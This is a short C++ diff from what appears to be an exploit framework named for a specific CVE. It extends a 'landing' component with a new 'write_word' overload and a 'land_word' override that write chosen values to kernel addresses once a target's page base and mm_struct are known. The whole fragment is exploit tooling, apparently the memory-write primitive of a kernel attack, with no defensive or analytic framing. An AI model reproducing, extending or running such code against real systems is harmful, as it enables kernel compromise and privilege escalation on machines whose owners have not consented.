@@ -31,6 +31,14 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         /** Open the window, do the write, close it and reclaim on every exit path. */
         [[nodiscard]] virtual bool write_word(std::uint64_t address, std::uint64_t value,
                                               std::uint64_t offset) noexcept = 0;
+
+        /** The same, with the write shape; the default keeps the old window path unchanged. */
+        [[nodiscard]] virtual bool write_word(std::uint64_t address, std::uint64_t value,
+                                              const memory::WriteRequest &request,
+                                              std::uint64_t offset) noexcept {
+            static_cast<void>(request);
+            return write_word(address, value, offset);
+        }
     };
 
     /** Multicast, behind the landing. */
@@ -76,6 +84,19 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 return false;
             }
             return window_.write_word(address, value, offset);
+        }
+
+        /** Land one word with its write shape; the window decides how the shape is consumed. */
+        [[nodiscard]] bool land_word(std::uint64_t address, std::uint64_t value,
+                                     const memory::WriteRequest &request,
+                                     std::uint64_t offset) noexcept override {
+            if (!up_) {
+                return false;
+            }
+            if (target_.page_base == 0U || target_.mm_struct == 0U) {
+                return false;
+            }
+            return window_.write_word(address, value, request, offset);
         }
 
         /** Multicast writes and does not read; the object and the page are what it writes to. */
